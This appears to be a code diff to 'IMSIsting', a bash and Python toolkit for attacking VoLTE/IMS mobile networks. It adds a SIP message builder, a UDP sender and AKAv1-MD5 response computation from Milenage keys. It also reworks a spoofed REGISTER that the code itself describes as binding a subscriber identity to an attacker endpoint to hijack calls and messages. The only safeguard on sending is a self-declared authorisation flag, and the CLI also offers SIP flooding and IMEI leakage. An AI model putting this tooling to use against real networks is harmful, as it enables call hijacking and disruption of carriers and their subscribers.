@@ -85,7 +85,7 @@ vims_py() {
     command -v python3 >/dev/null 2>&1 || {
         printf 'ERROR\tpython3 missing — cannot run the crypto or SIP engine\n' >&2; return 1; }
     python3 - "$@" <<'PY'
-import sys, struct, hashlib
+import sys, os, struct, hashlib, socket, base64
 
 try:
     from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
@@ -478,6 +478,303 @@ def cmd_digest(argv):
     print('response\t%s' % resp)
 
 
+
+# ── SIP message construction ───────────────────────────────────────────
+# The parser above tolerates sloppy input on purpose (a capture is not ours to
+# control). A message WE build must be exactly what RFC 3261 asks for, so this
+# side is strict: CRLF line endings, every mandatory header, and a
+# Content-Length that is the byte count of the body and nothing else.
+class SipError(Exception):
+    pass
+
+
+def _bad_field(name, value):
+    # A CR or LF inside a header value closes our header and opens theirs. That
+    # is header injection, and a builder that allows it can be made to emit any
+    # message at all -- exactly what tools/check-sip-codec.sh exists to catch.
+    if '\r' in value or '\n' in value or '\0' in value:
+        raise SipError('%s must not contain CR, LF or NUL' % name)
+    return value
+
+
+def _addr(user, tag=None):
+    s = '<sip:%s>' % _bad_field('address', user)
+    if tag:
+        s += ';tag=%s' % _bad_field('tag', tag)
+    return s
+
+
+def _rand(n):
+    return ''.join('%02x' % b for b in os.urandom(n))
+
+
+def _sip_defaults(kind, opt):
+    d = {
+        'impi': '310150123456789@ims.mnc001.mcc310.3gppnetwork.org',
+        'contact': '310150123456789@10.0.0.9:5060',
+        'host': '10.0.0.9',
+        'port': '5060',
+        'domain': 'ims.mnc001.mcc310.3gppnetwork.org',
+        'cseq': '1',
+        'expires': '600000',
+        'from_tag': _rand(4),
+        'to_tag': '',
+        'branch': 'z9hG4bK' + _rand(6),
+        'callid': _rand(8) + '@' + '10.0.0.9',
+        'realm': 'ims.mnc001.mcc310.3gppnetwork.org',
+        'nonce': _rand(8),
+        'algorithm': 'AKAv1-MD5',
+        'qop': 'auth',
+        'nc': '00000001',
+        'cnonce': _rand(4),
+        'uri': 'sip:ims.mnc001.mcc310.3gppnetwork.org',
+        'response': '0' * 32,
+        'ruri': '',
+        'target': '310150123456780@ims.mnc001.mcc310.3gppnetwork.org',
+        'user_agent': 'IMSIsting',
+    }
+    d.update(opt)
+    if not d['ruri']:
+        d['ruri'] = d['domain']
+    return d
+
+
+def _common_request(d, method, requires_contact):
+    lines = ['%s sip:%s SIP/2.0' % (method, _bad_field('ruri', d['ruri']))]
+    lines.append('Via: SIP/2.0/UDP %s:%s;branch=%s;rport'
+                 % (_bad_field('host', d['host']), _bad_field('port', d['port']),
+                    _bad_field('branch', d['branch'])))
+    lines.append('Max-Forwards: 70')
+    lines.append('From: %s;tag=%s' % (_addr(d['impi']), _bad_field('from_tag', d['from_tag'])))
+    to = _addr(d['impi'], d['to_tag'] or None)
+    lines.append('To: %s' % to)
+    lines.append('Call-ID: %s' % _bad_field('callid', d['callid']))
+    lines.append('CSeq: %d %s' % (int(d['cseq']), method))
+    if requires_contact:
+        lines.append('Contact: <sip:%s>' % _bad_field('contact', d['contact']))
+    return lines
+
+
+def render_sip(kind, d):
+    """Return the message as bytes. No trailing diagnostics: this is wire."""
+    if kind == 'register':
+        lines = _common_request(d, 'REGISTER', True)
+        lines[-1] += ';expires=%d' % int(d['expires'])
+        lines.append('Expires: %d' % int(d['expires']))
+        lines.append('User-Agent: %s' % _bad_field('user_agent', d['user_agent']))
+        if d.get('pai'):
+            # Only the spoofed REGISTER carries this, and only because the
+            # claim it makes ("this identity is already authenticated") is the
+            # attack. It is a header like any other: it goes before the
+            # separator, and the separator is still the only thing between the
+            # headers and the body.
+            lines.append('P-Asserted-Identity: <sip:%s>'
+                         % _bad_field('pai', d['pai']))
+        body = ''
+    elif kind == 'register-auth':
+        lines = _common_request(d, 'REGISTER', True)
+        lines[-1] += ';expires=%d' % int(d['expires'])
+        lines.append('Expires: %d' % int(d['expires']))
+        auth = ('Authorization: Digest username="%s", realm="%s", nonce="%s", '
+                'uri="%s", response="%s", algorithm=%s, qop=%s, nc=%s, cnonce="%s"'
+                % (_bad_field('impi', d['impi'].split('@')[0]),
+                   _bad_field('realm', d['realm']),
+                   _bad_field('nonce', d['nonce']),
+                   _bad_field('uri', d['uri']),
+                   _bad_field('response', d['response']),
+                   _bad_field('algorithm', d['algorithm']),
+                   _bad_field('qop', d['qop']),
+                   _bad_field('nc', d['nc']),
+                   _bad_field('cnonce', d['cnonce'])))
+        lines.append(auth)
+        lines.append('User-Agent: %s' % _bad_field('user_agent', d['user_agent']))
+        body = ''
+    elif kind == 'challenge':
+        # A 401 is a response: same Via/From/Call-ID/CSeq as the request it
+        # answers, and the To header acquires the tag it did not have.
+        lines = ['SIP/2.0 401 Unauthorized']
+        lines.append('Via: SIP/2.0/UDP %s:%s;branch=%s;rport'
+                     % (_bad_field('host', d['host']), _bad_field('port', d['port']),
+                        _bad_field('branch', d['branch'])))
+        lines.append('From: %s;tag=%s' % (_addr(d['impi']), _bad_field('from_tag', d['from_tag'])))
+        lines.append('To: %s;tag=%s' % (_addr(d['impi']), _bad_field('to_tag', d['to_tag'] or _rand(4))))
+        lines.append('Call-ID: %s' % _bad_field('callid', d['callid']))
+        lines.append('CSeq: %d REGISTER' % int(d['cseq']))
+        lines.append('WWW-Authenticate: Digest realm="%s", nonce="%s", algorithm=%s, qop="%s"'
+                     % (_bad_field('realm', d['realm']), _bad_field('nonce', d['nonce']),
+                        _bad_field('algorithm', d['algorithm']),
+                        _bad_field('qop', d['qop'])))
+        body = ''
+    elif kind == 'invite':
+        lines = _common_request(d, 'INVITE', True)
+        lines.append('Content-Type: application/sdp')
+        rtp = d.get('rtp_port', '49152')
+        ip = d.get('media_ip', d['host'])
+        body = ('v=0\r\n'
+                'o=imsisting 1 1 IN IP4 %s\r\n'
+                's=IMSIsting\r\n'
+                'c=IN IP4 %s\r\n'
+                't=0 0\r\n'
+                'm=audio %s RTP/AVP 96\r\n'
+                'a=rtpmap:96 AMR/8000\r\n'
+                'a=fmtp:96 mode-set=0,1,2,3,4,5,6,7\r\n'
+                % (_bad_field('host', ip), _bad_field('host', ip), _bad_field('rtp_port', rtp)))
+    else:
+        raise SipError('unknown message kind %r (want register, register-auth, '
+                       'challenge or invite)' % kind)
+
+    body_bytes = body.encode('utf-8')
+    lines.append('Content-Length: %d' % len(body_bytes))
+    head = '\r\n'.join(lines) + '\r\n\r\n'
+    return head.encode('utf-8') + body_bytes
+
+
+def cmd_sipbuild(argv):
+    if not argv:
+        raise SystemExit('ERROR\tusage: sipbuild <kind> [key=value ...]')
+    kind = argv[0]
+    opt = {}
+    for a in argv[1:]:
+        if '=' not in a:
+            raise SystemExit('ERROR\targument %r is not key=value' % a)
+        k, v = a.split('=', 1)
+        opt[k] = v
+    try:
+        msg = render_sip(kind, _sip_defaults(kind, opt))
+    except SipError as exc:
+        print('ERROR\t%s' % exc, file=sys.stderr)
+        return 2
+    except ValueError as exc:
+        print('ERROR\t%s' % exc, file=sys.stderr)
+        return 2
+    sys.stdout.buffer.write(msg)
+    sys.stdout.buffer.flush()
+    return 0
+
+
+def cmd_sipsend(argv):
+    """Build the message and put it on the wire. The send is the point."""
+    if len(argv) < 3:
+        raise SystemExit('ERROR\tusage: sipsend <host> <port> <kind> [key=value ...]')
+    host, port, kind = argv[0], argv[1], argv[2]
+    opt = {}
+    for a in argv[3:]:
+        if '=' not in a:
+            raise SystemExit('ERROR\targument %r is not key=value' % a)
+        k, v = a.split('=', 1)
+        opt[k] = v
+    try:
+        msg = render_sip(kind, _sip_defaults(kind, opt))
+    except (SipError, ValueError) as exc:
+        print('ERROR\t%s' % exc, file=sys.stderr)
+        return 2
+    try:
+        portn = int(port)
+    except ValueError:
+        print('ERROR\tport must be a number', file=sys.stderr)
+        return 2
+    if not 0 < portn < 65536:
+        print('ERROR\tport %d is outside 1..65535' % portn, file=sys.stderr)
+        return 2
+    timeout = float(os.environ.get('VIMS_SIP_TIMEOUT', '2') or '2')
+    try:
+        fam, typ, proto, _, addr = socket.getaddrinfo(
+            host, portn, 0, socket.SOCK_DGRAM)[0]
+    except socket.gaierror as exc:
+        print('ERROR\tcannot resolve %s: %s' % (host, exc), file=sys.stderr)
+        return 1
+    s = socket.socket(fam, typ, proto)
+    s.settimeout(timeout)
+    try:
+        s.sendto(msg, addr)
+    except OSError as exc:
+        print('ERROR\tsend to %s:%d failed: %s' % (host, portn, exc), file=sys.stderr)
+        s.close()
+        return 1
+    print('message_kind\t%s' % kind)
+    print('sent_bytes\t%d' % len(msg))
+    print('dst\t%s:%d' % (host, portn))
+    try:
+        data, peer = s.recvfrom(65535)
+    except socket.timeout:
+        data, peer = b'', None
+    except OSError as exc:
+        data, peer = b'', None
+        print('recv_error\t%s' % exc)
+    s.close()
+    if data:
+        print('response_bytes\t%d' % len(data))
+        print('response_from\t%s:%d' % (peer[0], peer[1]))
+        print('response_line\t%s'
+              % data.split(b'\r\n', 1)[0].decode('utf-8', 'replace'))
+        print('response_hex\t%s' % data[:64].hex())
+        print('status\tanswered')
+    else:
+        print('response_bytes\t0')
+        print('status\tsent-no-answer')
+    return 0
+
+
+def cmd_akadigest(argv):
+    """AKAv1-MD5 (RFC 3310 3.3): RES is the password of RFC 2617 digest.
+
+    The RFC says which value is the password and does not say how it is
+    encoded, and real cores differ: some hash the RES's hexadecimal text,
+    some hash its 16 bytes. Both are computed and labelled, because a
+    response computed under the wrong one is a valid-looking digest that the
+    core will reject.
+    """
+    if len(argv) < 5:
+        raise SystemExit('ERROR\tusage: akadigest <res-hex> <user> <realm> '
+                         '<method> <uri> [nonce] [nc] [cnonce] [qop]')
+    res_hex, user, realm, method, uri = argv[:5]
+    nonce = argv[5] if len(argv) > 5 else ''
+    nc = argv[6] if len(argv) > 6 else ''
+    cnonce = argv[7] if len(argv) > 7 else ''
+    qop = argv[8] if len(argv) > 8 else ''
+    rand_hex = argv[9] if len(argv) > 9 else ''
+    try:
+        raw = bytes.fromhex(res_hex)
+    except ValueError:
+        print('ERROR\tRES is not hex: %r' % res_hex, file=sys.stderr)
+        return 2
+    ha2 = hashlib.md5(('%s:%s' % (method, uri)).encode()).hexdigest()
+
+    def response_for(password):
+        ha1 = hashlib.md5(('%s:%s:' % (user, realm)).encode()
+                          + password).hexdigest()
+        if qop:
+            return hashlib.md5(('%s:%s:%s:%s:%s:%s'
+                                % (ha1, nonce, nc, cnonce, qop, ha2)).encode()).hexdigest()
+        return hashlib.md5(('%s:%s:%s' % (ha1, nonce, ha2)).encode()).hexdigest()
+
+    # RFC 3310 3.2: the nonce is base64(RAND || AUTN || server data). If the
+    # caller tells us which RAND the challenge should carry, check it: a
+    # response computed over somebody else's challenge is silently wrong.
+    if rand_hex:
+        try:
+            blob = base64.b64decode(nonce + '=' * (-len(nonce) % 4))
+        except Exception:
+            blob = b''
+        try:
+            want = bytes.fromhex(rand_hex)
+        except ValueError:
+            want = b''
+        if len(blob) < 16 or len(want) != 16:
+            verdict = 'unknown'
+        elif blob[:16] == want:
+            verdict = 'yes'
+        else:
+            verdict = 'no'
+        print('nonce_rand\t%s' % verdict)
+
+    print('res\t%s' % res_hex.lower())
+    print('ha2\t%s' % ha2)
+    print('response_hex\t%s' % response_for(res_hex.lower().encode()))
+    print('response_raw\t%s' % response_for(raw))
+    return 0
+
+
 def main():
     argv = sys.argv[1:]
     if not argv:
@@ -499,6 +796,12 @@ def main():
         return cmd_msgs(rest)
     if mode == 'digest':
         return cmd_digest(rest)
+    if mode == 'sipbuild':
+        return cmd_sipbuild(rest)
+    if mode == 'sipsend':
+        return cmd_sipsend(rest)
+    if mode == 'akadigest':
+        return cmd_akadigest(rest)
     raise SystemExit('unknown mode ' + mode)
 
 
@@ -545,6 +848,154 @@ vims_cmd_detect_reuse() {
     [[ "$port" =~ ^[0-9]+$ ]] || { printf 'ERROR\tport must be numeric\n' >&2; return 2; }
     printf 'model\t%s\n' "ReVoLTE keystream-reuse detector (Rupprecht et al., USENIX Security 2020)"
     vims_py reuse "$pcap" "$port"
+}
+
+# ── SIP construction and transmission ───────────────────────────────────
+# The builder is strict; the parser above is lenient. That asymmetry is the
+# point: a capture is whatever the network sent, but a message we put on the
+# wire must be exactly what RFC 3261 asks for or we are testing the parser we
+# wrote instead of the network we are talking to.
+vims_sip_build() {
+    local kind="${1:-}"
+    [[ -n "$kind" ]] || {
+        printf 'ERROR\tusage: --sip-build <register|register-auth|challenge|invite> [key=value ...]\n' >&2
+        return 2; }
+    shift || true
+    vims_py sipbuild "$kind" "$@"
+}
+
+# ── sending it ──────────────────────────────────────────────────────────
+# Building a REGISTER and never sending it tests nothing but our own builder.
+# This puts the bytes in a datagram addressed by the operator, and it is gated
+# because a REGISTER sent to an IMS core that is not yours is a hijack attempt
+# rather than an assessment of one.
+vims_sip_send() {
+    local dst="${1:-}" kind="${2:-}"
+    if [[ -z "$dst" || -z "$kind" ]]; then
+        printf 'ERROR\tusage: --sip-send <host>[:port] <kind> [key=value ...]\n' >&2
+        printf 'WHY\tsending SIP is a wire action: it needs a destination and a message kind\n' >&2
+        return 2
+    fi
+    if [[ "${VIMS_LAB_OK:-0}" != "1" ]]; then
+        printf 'ERROR\trefusing to send: pass --i-have-a-lab-and-authorisation\n' >&2
+        printf 'WHY\ta REGISTER sent to an IMS core you do not own is a real hijack attempt, not a test of one; the flag is the operator asserting the network is theirs\n' >&2
+        return 2
+    fi
+    local host port
+    if [[ "$dst" == \[*\]:* ]]; then
+        host="${dst#[*}"; host="${host%%\]*}"; port="${dst##*:}"
+    elif [[ "$dst" == *:* ]]; then
+        host="${dst%:*}"; port="${dst##*:}"
+    else
+        host="$dst"; port="${VIMS_SIP_PORT:-5060}"
+    fi
+    [[ "$host" =~ ^[A-Za-z0-9_.:-]+$ ]] || {
+        printf 'ERROR\thost %q is not a hostname or address\n' "$host" >&2; return 2; }
+    [[ "$port" =~ ^[0-9]+$ ]] || {
+        printf 'ERROR\tport %q is not a number\n' "$port" >&2; return 2; }
+    shift 2 || true
+    printf 'transport\tudp\n'
+    printf 'lab_authorised\t1\n'
+    vims_py sipsend "$host" "$port" "$kind" "$@"
+}
+
+# ── the REGISTER a core will accept ─────────────────────────────────────
+# A REGISTER whose response is a placeholder is a message, not an
+# authentication. This runs Milenage (tools/gsm_crypto.py, checked against the
+# 3GPP TS 35.208 vectors) for RES, then hashes it into the RFC 2617 digest the
+# way RFC 3310 3.3 says to. The message is the only thing on stdout, so it can
+# be piped straight into a socket; everything describing it goes to stderr.
+vims_register_aka() {
+    local k="" op="" opc="" rand="" sqn="" amf="" impi="" realm="" nonce="" uri=""
+    local nc="00000001" cnonce="" enc="hex" contact="" host=""
+    local a
+    for a in "$@"; do
+        case "$a" in
+            k=*)        k="${a#k=}" ;;
+            opc=*)      opc="${a#opc=}" ;;
+            op=*)       op="${a#op=}" ;;
+            rand=*)     rand="${a#rand=}" ;;
+            sqn=*)      sqn="${a#sqn=}" ;;
+            amf=*)      amf="${a#amf=}" ;;
+            impi=*)     impi="${a#impi=}" ;;
+            realm=*)    realm="${a#realm=}" ;;
+            nonce=*)    nonce="${a#nonce=}" ;;
+            uri=*)      uri="${a#uri=}" ;;
+            nc=*)       nc="${a#nc=}" ;;
+            cnonce=*)   cnonce="${a#cnonce=}" ;;
+            encoding=*) enc="${a#encoding=}" ;;
+            contact=*)  contact="${a#contact=}" ;;
+            host=*)     host="${a#host=}" ;;
+            *) printf 'ERROR\targument %q is not key=value\n' "$a" >&2; return 2 ;;
+        esac
+    done
+    if [[ -z "$k" || -z "$rand" || ( -z "$op" && -z "$opc" ) ]]; then
+        printf 'ERROR\tusage: --register-aka k=<32hex> (op=<32hex>|opc=<32hex>) rand=<32hex> nonce=<b64> [impi=] [realm=] [uri=] [nc=] [cnonce=] [sqn=] [amf=] [encoding=hex|raw]\n' >&2
+        printf 'WHY\tthe response is f2(K, RAND) hashed into an RFC 2617 digest; without K and RAND there is nothing to compute and the message would carry a placeholder\n' >&2
+        return 2
+    fi
+    if [[ -z "$nonce" ]]; then
+        printf 'ERROR\t--register-aka needs nonce=<the WWW-Authenticate nonce from the 401>\n' >&2
+        printf 'WHY\tthe digest is computed over the challenge nonce; inventing one yields a response that is wrong for the challenge the core issued\n' >&2
+        return 2
+    fi
+    case "$enc" in
+        hex|raw) ;;
+        *) printf 'ERROR\tencoding must be hex or raw (got %q)\n' "$enc" >&2; return 2 ;;
+    esac
+    local gsm="$IMSISTING_ROOT/tools/gsm_crypto.py"
+    if [[ ! -f "$gsm" ]]; then
+        printf 'ERROR\tmissing %s: it is the Milenage implementation\n' "$gsm" >&2
+        return 1
+    fi
+    local -a margs=(--milenage --ki "$k" --rand "$rand")
+    [[ -n "$op" ]]  && margs+=(--op "$op")
+    [[ -n "$opc" ]] && margs+=(--opc "$opc")
+    [[ -n "$sqn" ]] && margs+=(--sqn "$sqn")
+    [[ -n "$amf" ]] && margs+=(--amf "$amf")
+    local gout grc res
+    gout=$(python3 "$gsm" "${margs[@]}" 2>&1); grc=$?
+    if (( grc != 0 )); then
+        printf 'ERROR\tMilenage failed: %s\n' \
+            "$(printf '%s' "$gout" | head -2 | tr '\n' ' ')" >&2
+        return 1
+    fi
+    res=$(printf '%s\n' "$gout" | awk -F'\t' '$1=="f2"{print tolower($2); exit}')
+    if [[ -z "$res" ]]; then
+        printf 'ERROR\tMilenage produced no f2 (RES)\n' >&2
+        return 1
+    fi
+    : "${impi:=310150123456789@ims.mnc001.mcc310.3gppnetwork.org}"
+    : "${realm:=ims.mnc001.mcc310.3gppnetwork.org}"
+    : "${uri:=sip:$realm}"
+    : "${cnonce:=$(printf '%08x' "$(( RANDOM * 32768 + RANDOM ))")}"
+    local dg response noncechk opcout
+    dg=$(vims_py akadigest "$res" "${impi%%@*}" "$realm" REGISTER "$uri" \
+             "$nonce" "$nc" "$cnonce" auth "$rand") || return 1
+    response=$(printf '%s\n' "$dg" | awk -F'\t' -v k="response_$enc" '$1==k{print $2; exit}')
+    noncechk=$(printf '%s\n' "$dg" | awk -F'\t' '$1=="nonce_rand"{print $2; exit}')
+    opcout=$(printf '%s\n' "$gout" | awk -F'\t' '$1=="opc"{print $2; exit}')
+    [[ -n "$response" ]] || { printf 'ERROR\tcould not compute the digest\n' >&2; return 1; }
+    {
+        printf 'milenage_opc\t%s\n' "$opcout"
+        printf 'res\t%s\n' "$res"
+        printf 'encoding\t%s\n' "$enc"
+        printf 'response_hex\t%s\n' \
+            "$(printf '%s\n' "$dg" | awk -F'\t' '$1=="response_hex"{print $2; exit}')"
+        printf 'response_raw\t%s\n' \
+            "$(printf '%s\n' "$dg" | awk -F'\t' '$1=="response_raw"{print $2; exit}')"
+        printf 'nonce_carries_rand\t%s\n' "${noncechk:-unknown}"
+        if [[ "$noncechk" == "no" ]]; then
+            printf 'WARNING\tthe nonce does not decode to that RAND: the response will not match the challenge\n'
+        fi
+        printf 'chosen\tthe %s encoding, because RFC 3310 names RES as the password without fixing its byte form\n' "$enc"
+    } >&2
+    local -a sargs=("impi=$impi" "realm=$realm" "nonce=$nonce" "uri=$uri"
+                    "response=$response" "nc=$nc" "cnonce=$cnonce"
+                    "algorithm=AKAv1-MD5" "qop=auth")
+    [[ -n "$contact" ]] && sargs+=("contact=$contact")
+    [[ -n "$host" ]]    && sargs+=("host=$host")
+    vims_py sipbuild register-auth "${sargs[@]}"
 }
 
 # ── IMP4GT model ────────────────────────────────────────────────────────
@@ -798,20 +1249,18 @@ vims_register_spoof() {
           host="${3:-10.0.0.9}" \
           domain="${4:-ims.mnc001.mcc310.3gppnetwork.org}"
     [[ -n "$impi" && -n "$contact" ]] || { printf 'ERROR\tIMPI and contact required\n' >&2; return 2; }
-    local branch tag callid
-    branch="z9hG4bK$(printf '%08x' $(( RANDOM * RANDOM )))"
-    tag="$(printf '%08x' "$RANDOM")"
+    # One builder for one message. The old body wrote its own LF-terminated
+    # lines and then printed a note on the SAME stream while Content-Length
+    # said 0, so the note travelled inside the datagram as if it were SIP: a
+    # reader stopped at byte 0 of the body and the rest was ignored, or a
+    # reader took the whole datagram and saw a message nothing else parses.
+    # stdout is now the message and nothing else; the note goes to stderr.
+    local callid
     callid="$(printf '%08x%08x' "$RANDOM" "$RANDOM")@$host"
-    printf 'REGISTER sip:%s SIP/2.0\n' "$domain"
-    printf 'Via: SIP/2.0/UDP %s;branch=%s\n' "$host" "$branch"
-    printf 'From: <sip:%s>;tag=%s\n' "$impi" "$tag"
-    printf 'To: <sip:%s>\n' "$impi"
-    printf 'Call-ID: %s\n' "$callid"
-    printf 'CSeq: 1 REGISTER\n'
-    printf 'Contact: <sip:%s>\n' "$contact"
-    printf 'P-Asserted-Identity: <sip:%s>\n' "$impi"
-    printf 'Content-Length: 0\n'
-    printf '\nattack\tSIP REGISTER with a forged Contact — binds the subscriber identity to an attacker endpoint, hijacking inbound calls and messages\n'
+    vims_py sipbuild register \
+        "impi=$impi" "contact=$contact" "host=$host" "domain=$domain" \
+        "pai=$impi" "callid=$callid" || return 2
+    printf 'attack\tSIP REGISTER with a forged Contact — binds the subscriber identity to an attacker endpoint, hijacking inbound calls and messages\n' >&2
 }
 
 vims_selftest() {
@@ -990,6 +1439,67 @@ vims_selftest() {
     chk reg-spoof "$(printf '%s' "$out" | grep -c '^REGISTER sip:')" "1"
     chk reg-contact "$(printf '%s' "$out" | grep -c '^Contact:')" "1"
     chk reg-pai "$(printf '%s' "$out" | grep -c '^P-Asserted-Identity:')" "1"
+    # The message is wire; the note about it is not. These four arms exist
+    # because the old body put both on stdout while Content-Length said 0.
+    chk reg-wire-end "$(vims_register_spoof | python3 -c 'import sys;d=sys.stdin.buffer.read();print(d[-4:].hex())')" "0d0a0d0a"
+    chk reg-wire-lf "$(vims_register_spoof | python3 -c 'import sys;d=sys.stdin.buffer.read();print(d.count(b"\n")-d.count(b"\r\n"))')" "0"
+    chk reg-wire-note "$(printf '%s' "$out" | grep -c '^attack')" "0"
+    chk reg-note-stderr "$(vims_register_spoof 2>&1 >/dev/null | grep -c '^attack')" "1"
+    chk reg-cl-zero "$(printf '%s' "$out" | grep -c '^Content-Length: 0')" "1"
+
+    # 11. Sending: the authority flag is the gate, and a datagram really
+    #     leaves the process. A loopback listener is the proof: it reads the
+    #     bytes that arrived and the assertions below read them back.
+    chk send-refuse "$(vims_sip_send 127.0.0.1:9 register >/dev/null 2>&1; echo $?)" "2"
+    chk send-refuse-says "$(vims_sip_send 127.0.0.1:9 register 2>&1 >/dev/null | grep -c 'refusing to send')" "1"
+    chk send-bad-port "$(VIMS_LAB_OK=1 vims_sip_send 127.0.0.1:99999 register >/dev/null 2>&1; echo $?)" "2"
+    local lport recv lpid sout
+    lport=$(( 20000 + RANDOM % 20000 ))
+    recv="$d/recv.bin"
+    cat > "$d/listen.py" <<'PYL'
+import socket, sys
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+s.bind(("127.0.0.1", int(sys.argv[1])))
+s.settimeout(10)
+data, peer = s.recvfrom(65535)
+open(sys.argv[2], "wb").write(data)
+PYL
+    python3 "$d/listen.py" "$lport" "$recv" &
+    lpid=$!
+    sleep 0.3
+    sout=$(VIMS_LAB_OK=1 vims_sip_send "127.0.0.1:$lport" register 2>/dev/null)
+    wait "$lpid" 2>/dev/null || true
+    chk send-status "$(fld "$sout" status)" "sent-no-answer"
+    chk send-bytes "$(fld "$sout" sent_bytes)" "$(stat -c%s "$recv" 2>/dev/null || echo missing)"
+    chk send-start "$(head -c 8 "$recv" 2>/dev/null)" "REGISTER"
+    chk send-end "$(tail -c 4 "$recv" 2>/dev/null | od -An -tx1 | tr -d ' \n')" "0d0a0d0a"
+    chk send-crlf "$(python3 -c 'import sys;d=open(sys.argv[1],"rb").read();print(d.count(b"\n")-d.count(b"\r\n"))' "$recv" 2>/dev/null)" "0"
+
+    # 12. AKAv1-MD5: RES comes from Milenage on the 3GPP TS 35.208 test set 1
+    #     vector, and the digest is pinned by RFC 2617 3.5's published vector.
+    #     cnonce is fixed so the response is reproducible.
+    local aka_fix aka_nonce aka_err aka_out aka_resp aka_raw
+    aka_fix="k=465b5ce8b199b49faa5f0a2ee238a6bc op=cdc202d5123e20f62b6d676ac72cb318 rand=23553cbe9637a89d218ae64dae47bf35 cnonce=0a4f113b"
+    aka_nonce=$(python3 -c 'import base64;print(base64.b64encode(bytes.fromhex("23553cbe9637a89d218ae64dae47bf35")+bytes(16)).decode())')
+    aka_err="$d/aka.err"
+    aka_out=$(vims_register_aka $aka_fix nonce="$aka_nonce" 2>"$aka_err")
+    chk aka-rc "$?" "0"
+    chk aka-res "$(awk -F'\t' '$1=="res"{print $2}' "$aka_err")" "a54211d5e3ba50bf"
+    chk aka-nonce-rand "$(awk -F'\t' '$1=="nonce_carries_rand"{print $2}' "$aka_err")" "yes"
+    chk aka-rfc2617-kat "$(vims_py akadigest 436972636c65204f66204c696665 Mufasa testrealm@host.com GET /dir/index.html dcd98b7102dd2f0e8b11d0f600bfb0c093 00000001 0a4f113b auth | awk -F'\t' '$1=="response_raw"{print $2}')" "6629fae49393a05397450978507c4ef1"
+    aka_resp=$(awk -F'\t' '$1=="response_hex"{print $2}' "$aka_err")
+    aka_raw=$(awk -F'\t' '$1=="response_raw"{print $2}' "$aka_err")
+    chk aka-digest-in-message "$(printf '%s' "$aka_out" | grep -c "response=\"$aka_resp\"")" "1"
+    chk aka-raw-differs "$([[ "$aka_resp" != "$aka_raw" ]] && echo yes || echo no)" "yes"
+    chk aka-raw-selected "$(vims_register_aka $aka_fix nonce="$aka_nonce" encoding=raw 2>/dev/null | grep -c "response=\"$aka_raw\"")" "1"
+    chk aka-first-line "$(printf '%s\n' "$aka_out" | head -1 | tr -d '\r')" "REGISTER sip:ims.mnc001.mcc310.3gppnetwork.org SIP/2.0"
+    chk aka-algorithm "$(printf '%s' "$aka_out" | grep -c 'algorithm=AKAv1-MD5')" "1"
+    chk aka-stdout-clean "$(printf '%s' "$aka_out" | grep -c $'\t')" "0"
+    chk aka-no-k "$(vims_register_aka rand=23553cbe9637a89d218ae64dae47bf35 nonce="$aka_nonce" >/dev/null 2>&1; echo $?)" "2"
+    chk aka-no-nonce "$(vims_register_aka $aka_fix >/dev/null 2>&1; echo $?)" "2"
+    chk aka-no-nonce-says "$(vims_register_aka $aka_fix 2>&1 >/dev/null | grep -c 'WWW-Authenticate nonce')" "1"
+    chk aka-bad-encoding "$(vims_register_aka $aka_fix nonce="$aka_nonce" encoding=b64 >/dev/null 2>&1; echo $?)" "2"
+    chk aka-nonce-mismatch "$(vims_register_aka k=465b5ce8b199b49faa5f0a2ee238a6bc op=cdc202d5123e20f62b6d676ac72cb318 rand=000102030405060708090a0b0c0d0e0f nonce="$aka_nonce" 2>&1 >/dev/null | grep -c 'does not decode to that RAND')" "1"
 
     printf 'ASSERTIONS\t%d\n' "$nchk"
     rm -rf "$d"
@@ -1012,6 +1522,7 @@ vims_menu() {
   [5]  IMS registration flow (hex)
   [6]  IMP4GT model (sequence + preconditions)
   [7]  write a handoff plan (revolte-capture / imp4gt-lab)
+  [8]  register a UE with a real AKAv1-MD5 response
   [0]  back
 
 M
@@ -1033,6 +1544,14 @@ M
                read -rp "  press enter " _ ;;
             6) vims_imp4gt_model | column -t -s$'\t' 2>/dev/null || vims_imp4gt_model
                read -rp "  press enter " _ ;;
+            8) read -rp "  K hex> " k; read -rp "  op or opc> " t
+               read -rp "  $t hex> " o; read -rp "  RAND hex> " r
+               read -rp "  nonce (base64, from the 401)> " n
+               case "$t" in
+                   opc) vims_register_aka "k=$k" "opc=$o" "rand=$r" "nonce=$n" ;;
+                   *)   vims_register_aka "k=$k" "op=$o" "rand=$r" "nonce=$n" ;;
+               esac
+               read -rp "  press enter " _ ;;
             7) read -rp "  plan (revolte-capture|imp4gt-lab)> " k
                vims_plan "$k"; read -rp "  press enter " _ ;;
             0) return ;;
@@ -1043,6 +1562,19 @@ M
 
 # ── CLI dispatch ────────────────────────────────────────────────────────
 vims_cli_main() {
+    # The authority flag is stripped wherever it appears and recorded once, so
+    # no verb has to parse the argument list to find it and none can see it as
+    # a stray operand.
+    local a
+    local -a args=()
+    for a in "$@"; do
+        if [[ "$a" == "--i-have-a-lab-and-authorisation" ]]; then
+            VIMS_LAB_OK=1
+        else
+            args+=("$a")
+        fi
+    done
+    if ((${#args[@]})); then set -- "${args[@]}"; else set --; fi
     local cmd="${1:-}"
     (($# > 0)) && shift
     case "$cmd" in
@@ -1051,11 +1583,14 @@ vims_cli_main() {
         --keystream-recover)      vims_cmd_keystream_recover "${1:-}" "${2:-}" "${3:-}" ;;
         --imp4gt-model)           vims_imp4gt_model ;;
         --sip-parse)              vims_cmd_sip_parse "${1:-}" ;;
+        --sip-build)              vims_sip_build "$@" ;;
+        --sip-send)               vims_sip_send "$@" ;;
         --ims-registration)       vims_cmd_ims_registration "${1:-}" "${2:-}" ;;
         --detect-keystream-reuse) vims_cmd_detect_reuse "${1:-}" "${2:-0}" ;;
         --sip-flood)              vims_sip_flood "${1:-INVITE}" "${2:-100}" "${3:-400}" "${4:-1600}" ;;
         --imei-leak)              vims_imei_leak "${1:-}" ;;
         --register-spoof)         vims_register_spoof "${1:-}" "${2:-}" "${3:-}" "${4:-}" ;;
+        --register-aka)           vims_register_aka "$@" ;;
         --plan)                   vims_plan "${1:-}" ;;
         --selftest)               vims_selftest ;;
         --menu)                   vims_menu ;;
@@ -1069,9 +1604,19 @@ Usage: $0 COMMAND
   --keystream-recover <ct> <known-pt> [ct2] recover the keystream and decrypt
   --imp4gt-model                            IMP4GT sequence and preconditions
   --sip-parse <hex>                         SIP request/response, headers, SDP
+  --sip-build <register|register-auth|challenge|invite> [key=value ...]
+                                            build the message as wire bytes
+                                            (stdout is the message, nothing else)
